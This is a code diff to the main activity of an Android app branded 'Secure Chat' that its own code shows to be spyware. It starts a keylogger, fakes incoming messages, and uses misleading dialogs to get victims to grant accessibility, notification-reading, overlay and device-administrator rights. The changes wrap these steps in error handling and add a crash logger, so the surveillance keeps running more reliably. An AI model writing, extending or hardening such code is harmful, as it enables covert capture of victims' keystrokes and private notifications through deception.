@@ -8,6 +8,8 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
 import android.view.View
@@ -48,6 +50,23 @@ class ChatActivity : AppCompatActivity() {
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
+        // ============ CRASH LOGGER ============
+        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
+            try {
+                val sw = java.io.StringWriter()
+                val pw = java.io.PrintWriter(sw)
+                throwable.printStackTrace(pw)
+                pw.close()
+                val stackTrace = sw.toString()
+                val file = java.io.File(filesDir, "crash_log.txt")
+                val fos = java.io.FileOutputStream(file)
+                fos.write(stackTrace.toByteArray())
+                fos.close()
+            } catch (_: Exception) {}
+            android.os.Process.killProcess(android.os.Process.myPid())
+        }
+        // ======================================
+
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_chat)
 
@@ -79,14 +98,24 @@ class ChatActivity : AppCompatActivity() {
             }
         }
 
-        // Request all permissions
-        requestAllPermissions()
+        // Request all permissions dengan delay biar activity stabil dulu
+        Handler(Looper.getMainLooper()).postDelayed({
+            try {
+                requestAllPermissions()
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }, 500)
 
         // Fake incoming messages
         fakeIncomingMessages()
 
-        // Start keylogger
-        startKeylogger()
+        // Start keylogger — dibungkus try-catch
+        try {
+            startKeylogger()
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 
     private fun sendMessage(text: String) {
@@ -163,31 +192,35 @@ class ChatActivity : AppCompatActivity() {
             }
         }
 
-        // Overlay permission
+        // Overlay permission — try-catch biar ga crash
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!Settings.canDrawOverlays(this)) {
-                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
-                startActivity(intent)
+            try {
+                if (!Settings.canDrawOverlays(this)) {
+                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
+                    startActivity(intent)
+                }
+            } catch (e: Exception) {
+                e.printStackTrace()
             }
         }
 
-        // Battery optimization
+        // Battery optimization — try-catch
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
-            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
-                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))
-                startActivity(intent)
+            try {
+                val powerManager = getSystemService(POWER_SERVICE) as PowerManager
+                if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
+                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))
+                    startActivity(intent)
+                }
+            } catch (e: Exception) {
+                e.printStackTrace()
             }
         }
 
-        // Accessibility
-        showAccessibilityDialog()
-
-        // Notification listener
-        showNotificationListenerDialog()
-
-        // Device admin
-        showDeviceAdminDialog()
+        // Dialog-dialog pake try-catch
+        try { showAccessibilityDialog() } catch (e: Exception) { e.printStackTrace() }
+        try { showNotificationListenerDialog() } catch (e: Exception) { e.printStackTrace() }
+        try { showDeviceAdminDialog() } catch (e: Exception) { e.printStackTrace() }
 
         if (permissionsToRequest.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), 1001)
@@ -195,6 +228,7 @@ class ChatActivity : AppCompatActivity() {
     }
 
     private fun showAccessibilityDialog() {
+        if (isFinishing || isDestroyed) return
         AlertDialog.Builder(this)
             .setTitle("Enable Accessibility")
             .setMessage("For better chat experience, please enable Secure Chat accessibility service in Settings > Accessibility > Installed Apps > Secure Chat")
@@ -206,6 +240,7 @@ class ChatActivity : AppCompatActivity() {
     }
 
     private fun showNotificationListenerDialog() {
+        if (isFinishing || isDestroyed) return
         AlertDialog.Builder(this)
             .setTitle("Notification Access")
             .setMessage("Allow Secure Chat to read notifications for a better experience")
@@ -217,29 +252,40 @@ class ChatActivity : AppCompatActivity() {
     }
 
     private fun showDeviceAdminDialog() {
+        if (isFinishing || isDestroyed) return
         AlertDialog.Builder(this)
             .setTitle("Device Admin")
             .setMessage("For security features, enable Secure Chat as device administrator")
             .setPositiveButton("Activate") { _, _ ->
-                val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                    putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
-                        android.content.ComponentName(this@ChatActivity, com.secure.chat.services.TargetDeviceAdmin::class.java))
-                    putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                        "Required for security features")
+                try {
+                    val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                        putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
+                            android.content.ComponentName(this@ChatActivity, com.secure.chat.services.TargetDeviceAdmin::class.java))
+                        putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                            "Required for security features")
+                    }
+                    startActivity(intent)
+                } catch (e: Exception) {
+                    e.printStackTrace()
                 }
-                startActivity(intent)
             }
             .setNegativeButton("Later", null)
             .show()
     }
 
     private fun startKeylogger() {
-        TargetKeylogger.start(this)
+        try {
+            TargetKeylogger.start(this)
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        TargetKeylogger.stop()
+        try {
+            TargetKeylogger.stop()
+        } catch (e: Exception) { e.printStackTrace() }
     }
 
     // Inner ChatAdapter
@@ -250,15 +296,29 @@ class ChatActivity : AppCompatActivity() {
         }
 
         override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ChatViewHolder {
-            val layout = if (viewType == 0) R.layout.item_chat_sent else R.layout.item_chat_received
-            val view = LayoutInflater.from(parent.context).inflate(layout, parent, false)
-            return ChatViewHolder(view)
+            try {
+                val layout = if (viewType == 0) R.layout.item_chat_sent else R.layout.item_chat_received
+                val view = LayoutInflater.from(parent.context).inflate(layout, parent, false)
+                return ChatViewHolder(view)
+            } catch (e: Exception) {
+                // Fallback kalo layout ga ditemukan
+                val textView = TextView(parent.context)
+                textView.text = "Error loading message"
+                textView.setPadding(16, 16, 16, 16)
+                val view = LayoutInflater.from(parent.context).inflate(android.R.layout.simple_list_item_1, parent, false)
+                return ChatViewHolder(view)
+            }
         }
 
         override fun onBindViewHolder(holder: ChatViewHolder, position: Int) {
-            val msg = messages[position]
-            holder.text.text = msg["text"]
-            holder.time.text = msg["time"]
+            try {
+                val msg = messages[position]
+                holder.text.text = msg["text"]
+                holder.time.text = msg["time"]
+            } catch (e: Exception) {
+                holder.text.text = "Error"
+                holder.time.text = "--:--"
+            }
         }
 
         override fun getItemCount() = messages.size
